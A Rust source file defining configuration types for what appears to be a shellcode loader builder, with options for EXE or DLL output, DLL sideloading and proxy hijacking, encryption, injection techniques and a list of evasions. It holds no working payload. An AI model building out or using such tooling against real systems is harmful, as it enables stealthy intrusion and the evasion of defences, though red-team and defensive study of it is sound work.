use std::collections::HashMap;
use std::path::PathBuf;

use crate::polymorph::BuildSeed;

#[derive(Debug, Clone, PartialEq)]
pub enum OutputFormat { Exe, Dll, DllSideload }

impl OutputFormat {
    pub fn extension(&self) -> &'static str {
        match self {
            Self::Exe => "exe",
            Self::Dll | Self::DllSideload => "dll",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SideloadMode { Sideload, Proxy }

#[derive(Debug, Clone)]
pub struct SideloadConfig {
    pub target_dll: PathBuf,
    pub hijack_export: String,
    pub mode: SideloadMode,
    /// For Proxy mode (relative path): the renamed DLL the proxy forwards to (e.g. "Shaping.dll").
    pub renamed: String,
    /// For Proxy mode (absolute path): use target_dll's full path directly in DLL_NAME.
    pub use_absolute_path: bool,
}

#[derive(Debug, Clone)]
pub struct Order {
    pub shellcode_path: PathBuf,
    pub format: OutputFormat,
    pub encryption_id: String,
    pub injection_id: String,
    pub evasions: Vec<String>,
    pub params: HashMap<String, String>, // key = "<technique_id>.<param_name>"
    pub output: Option<PathBuf>,
    pub sideload: Option<SideloadConfig>,
    pub seed: BuildSeed,
}
